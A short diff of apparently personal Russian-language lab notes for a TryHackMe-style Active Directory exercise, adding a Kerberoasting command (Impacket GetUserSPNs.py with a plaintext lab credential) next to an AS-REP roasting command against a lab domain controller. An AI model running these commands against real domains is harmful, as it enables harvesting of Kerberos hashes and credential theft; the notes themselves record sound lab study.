@@ -93,3 +93,5 @@ enumdomgroup - перечисляет группы
 Поиск учетных записей без пароля
 python3 GetNPUsers.py enterprise.thm/ -dc-ip 10.10.38.153 -usersfile /home/max/users.txt -no-pass
 
+Глянуть SPN 
+python3 GetUserSPNs.py  -dc-ip 10.10.38.153 lab.enterprise.thm/nik:ToastyBoi!
